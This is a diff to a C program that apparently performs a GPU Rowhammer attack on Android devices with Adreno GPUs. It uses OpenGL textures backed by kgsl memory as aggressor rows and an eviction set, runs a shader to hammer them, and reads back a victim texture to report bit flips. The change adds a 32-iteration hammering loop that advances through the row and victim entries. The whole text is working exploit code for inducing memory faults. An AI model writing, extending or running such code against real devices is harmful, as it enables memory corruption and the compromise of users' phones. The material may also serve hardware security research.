@@ -414,7 +414,6 @@ int main(){
 	glDeleteShader(fragmentShader);
 
 	for(size_t i = 0; i < cont_kgsls; ++i){
-		// Hammering two rows...
 		// preparing program to run
 		struct kgsl_entry* row1 = kgsl_result[i];
 		for(int j = 0; j < 16; ++j){
@@ -431,48 +430,56 @@ int main(){
 			row2 = row2->kgsl_next;
 		}
 
-		glClearColor(0.0f, 0.0f, 0.0f, 0.0f);
-		glClear(GL_COLOR_BUFFER_BIT);
-		glUseProgram(shaderProgram2);
-		glVertexAttribPointer(0, 10, GL_INT, GL_FALSE, 3 * sizeof(int), (void*)0);
-	    	glEnableVertexAttribArray(0);
-
-		// Binding textures
-		GLuint row1TexLocation = glGetUniformLocation(shaderProgram, "row1");
-		GLuint row2TexLocation  = glGetUniformLocation(shaderProgram, "row2");
-		GLuint evictionTexLocation  = glGetUniformLocation(shaderProgram, "evict1");
-
-
-		glUniform1i(row1TexLocation, 0);
-		glUniform1i(row2TexLocation,  1);
-		glUniform1i(evictionTexLocation,  2);
-
-		glActiveTexture(GL_TEXTURE0 + 0); // Row1 Texture Unit
-		glBindTexture(GL_TEXTURE_2D, row1->kgsl_id);
 		
+		for( int k = 0; k < 32; ++k){
+			// Hammering two rows...
+			glClearColor(0.0f, 0.0f, 0.0f, 0.0f);
+			glClear(GL_COLOR_BUFFER_BIT);
+			glUseProgram(shaderProgram2);
+			glVertexAttribPointer(0, 10, GL_INT, GL_FALSE, 3 * sizeof(int), (void*)0);
+				glEnableVertexAttribArray(0);
 
-		glActiveTexture(GL_TEXTURE0 + 1); // Row2 Texture Unit
-		glBindTexture(GL_TEXTURE_2D, row2->kgsl_id);
+			// Binding textures
+			GLuint row1TexLocation = glGetUniformLocation(shaderProgram, "row1");
+			GLuint row2TexLocation  = glGetUniformLocation(shaderProgram, "row2");
+			GLuint evictionTexLocation  = glGetUniformLocation(shaderProgram, "evict1");
 
-		glActiveTexture(GL_TEXTURE0 + 2); // eviction Texture Unit
-		glBindTexture(GL_TEXTURE_2D, tex2[EVICTTEXT]);
-		printf("Trying to hammer chunk %d\n", i);
-		glFramebufferTexture2D(GL_FRAMEBUFFER, GL_COLOR_ATTACHMENT0, GL_TEXTURE_2D, victim->kgsl_id, 0);
-		// running the program
-		glDrawArrays(GL_POINTS, 0, 1);
-		unsigned int* frame2  = (unsigned int*)malloc(sizeof(unsigned int) * 32 * 32);
-		memset(frame2, 0x00, 32 * 32 * sizeof(unsigned int));
-		glReadPixels(0, 0, 32, 32, GL_RGBA,GL_UNSIGNED_BYTE, frame2);
-		printf("READVALS: \n");
-		for(int  i = 0; i < 32; ++i){
-			for( int j = 0; j < 32; ++j){
-				if(frame2[i * 32 + j] != 0xffffffff)
-					printf("FOUND BITFLIP %x\n", frame2[i * 32 + j]);
-			//	else
-			//		printf("NO BITFLIP %x\n", frame2[i * 32 + j]);	
-			}
-		} 
-		free(frame2);
+
+			glUniform1i(row1TexLocation, 0);
+			glUniform1i(row2TexLocation,  1);
+			glUniform1i(evictionTexLocation,  2);
+
+			glActiveTexture(GL_TEXTURE0 + 0); // Row1 Texture Unit
+			glBindTexture(GL_TEXTURE_2D, row1->kgsl_id);
+			
+
+			glActiveTexture(GL_TEXTURE0 + 1); // Row2 Texture Unit
+			glBindTexture(GL_TEXTURE_2D, row2->kgsl_id);
+
+			glActiveTexture(GL_TEXTURE0 + 2); // eviction Texture Unit
+			glBindTexture(GL_TEXTURE_2D, tex2[EVICTTEXT]);
+			printf("Trying to hammer chunk %d : %d\n", i, k);
+			glFramebufferTexture2D(GL_FRAMEBUFFER, GL_COLOR_ATTACHMENT0, GL_TEXTURE_2D, victim->kgsl_id, 0);
+			// running the program
+			glDrawArrays(GL_POINTS, 0, 1);
+			unsigned int* frame2  = (unsigned int*)malloc(sizeof(unsigned int) * 32 * 32);
+			memset(frame2, 0x00, 32 * 32 * sizeof(unsigned int));
+			glReadPixels(0, 0, 32, 32, GL_RGBA,GL_UNSIGNED_BYTE, frame2);
+			printf("READVALS: \n");
+			for(int  i = 0; i < 32; ++i){
+				for( int j = 0; j < 32; ++j){
+					if(frame2[i * 32 + j] != 0xffffffff)
+						printf("FOUND BITFLIP %x\n", frame2[i * 32 + j]);
+				//	else
+				//		printf("NO BITFLIP %x\n", frame2[i * 32 + j]);	
+				}
+			} 
+			free(frame2);
+			row1 = row1->kgsl_next;
+			row2 = row2->kgsl_next;
+			victim = victim->kgsl_next;
+		}
+		
 		
 	}	
 	printf("RESULT NUMBER IS %u\n", cont_kgsls);
